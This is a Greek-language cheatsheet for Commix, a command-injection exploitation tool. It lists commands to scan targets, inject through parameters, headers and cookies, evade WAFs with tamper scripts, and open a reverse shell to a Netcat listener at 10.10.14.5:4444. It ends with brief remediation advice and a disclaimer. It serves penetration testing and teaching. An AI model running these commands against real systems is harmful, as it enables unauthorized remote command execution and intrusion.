<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 Commix - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p align="center">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Ασφάλεια Ιστού">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</p>

<p align="center">
  <b>🌐 Αυτοματοποιημένο εργαλείο που έχει σχεδιαστεί για να ανιχνεύει και να εκμεταλλεύεται ευπάθειες Command Injection σε εφαρμογές ιστού και να δημιουργεί διαδραστικά κελύφη</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Overview & The Command Injection Primitive](#-overview--the-command-injection-primitive)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Basic Vulnerability Scanning] (#-basic-vulnerability-scanning)
- [Injecting Different HTTP Elements](#-injecting-different-http-elements)
  - [GET Parameters](#get-parameters)
  - [Δεδομένα POST (`--data`)](#post-data---data)
  - [HTTP Headers & Cookies](#http-headers--cookies)
- [Spawning Interactive & Reverse Shells](#-spawning-interactive--reverse-shells)
  - [Pseudo-Shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [Native Reverse Shell (`--reverse-ip`)](#native-reverse-shell---reverse-ip)
- [WAF Evasion & Tamper Scripts (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [Τεχνικές τυφλών βασισμένων σε αρχεία και χρόνους] (#-αρχείο-βασισμένη σε τυφλή τεχνική)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & The Command Injection Primitive

Ενώ το **SQLMap** αυτοματοποιεί την έγχυση SQL, το **Commix** (δημιουργημένο από τον **Αναστάσιο Στασινόπουλο**) είναι το χρυσό πρότυπο για την εύρεση και την εκμετάλλευση ελαττωμάτων του **OS Command Injection**.

Όταν οι εφαρμογές Ιστού περνούν με μη ασφαλή τρόπο τις εισόδους των χρηστών απευθείας στις λειτουργίες εκτέλεσης του λειτουργικού συστήματος (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), οι εισβολείς μπορούν να προσαρτήσουν αυθαίρετες εντολές φλοιού. Το Commix ανιχνεύει αυτόματα διανύσματα έγχυσης βάσει αποτελεσμάτων, εξόδου, τυφλού χρόνου και διανύσματα έγχυσης βάσει αρχείων.

---

## 📥 Εγκατάσταση
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 Βασική σάρωση ευπάθειας
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 Έγχυση διαφορετικών στοιχείων HTTP

### GET Parameters
Χρησιμοποιήστε την ετικέτα `INJECT_HERE` εάν υπάρχουν πολλές παράμετροι:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### Δεδομένα POST (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### Κεφαλίδες και cookie HTTP
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 Spawning Interactive & Reverse Shells

### Ψευδο-κέλυφος (`--os-shell`)

Όταν επιβεβαιωθεί η έγχυση, το Commix παρέχει ένα προσομοιωμένο ψευδοτερματικό απευθείας μέσα στην κονσόλα:
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### Native Reverse Shell (`--reverse-ip`)

Δώστε εντολή στο Commix να αποσύρει μια πλήρη διαδραστική αντίστροφη σύνδεση TCP πίσω στον ακροατή Netcat:
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 WAF Evasion & Tamper Scripts (`--tamper`)

Παρακάμψτε τα τείχη προστασίας εφαρμογών Ιστού (WAF) και τις μαύρες λίστες συμβολοσειρών χρησιμοποιώντας ενσωματωμένη παραβίαση συσκότισης:
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ Τεχνικές τυφλών βάσει αρχείων και χρόνου

Όταν η έξοδος δεν αποδίδεται ξανά στην απόκριση HTTP:
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Σάρωση παραμέτρου GET** | `commix -u "<URL>?param=val"` |
| **Σάρωση παραμέτρου POST** | `commix -u "<URL>" --data="param=val"` |
| **Μαζική μη διαδραστική σάρωση** | `commix -u "<URL>" --batch` |
| **Διαδραστικό Terminal Shell**| `commix -u "<URL>" --os-shell` |
| **Ρίξτε το αντίστροφο κέλυφος** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Επανάληψη αιτήματος Burp** | `commix -r burp_request.req` |
| **Χρήση Space Tamper** | `commix -u "<URL>" --tamper=space2ifs` |
| **Εκτέλεση μοναδικής εντολής** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Αποκατάσταση

1. **Αποφύγετε την εκτέλεση του κελύφους του λειτουργικού συστήματος:** Ποτέ μη συνενώνετε μη απολυμανμένες εισόδους χρήστη σε εντολές `system()`, `exec()` ή φλοιού.
2. **Χρησιμοποιήστε API εγγενούς γλώσσας:** Αντικαταστήστε τα βοηθητικά προγράμματα συστήματος με βιβλιοθήκες εγγενών γλωσσών προγραμματισμού (π.χ. χρησιμοποιήστε τη βιβλιοθήκη `socket` της Python αντί να εκτελέσετε το δυαδικό σύστημα `ping`).
3. **Αυστηρή λίστα επιτρεπόμενων:** Εάν η εισαγωγή του χρήστη πρέπει να υπαγορεύει την εκτέλεση του προγράμματος, επικυρώστε την εισαγωγή σε σχέση με μια αυστηρή αλφαριθμητική λίστα επιτρεπόμενων πριν από την επίκληση.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το Commix αυτοματοποιεί την εκτέλεση αυθαίρετων εντολών σε διακομιστές προορισμού. Η ασάφεια ή η εκμετάλλευση μη εξουσιοδοτημένων εφαρμογών Ιστού είναι παράνομη. Χρησιμοποιήστε μόνο σε συστήματα όπου διαθέτετε ρητή γραπτή εξουσιοδότηση.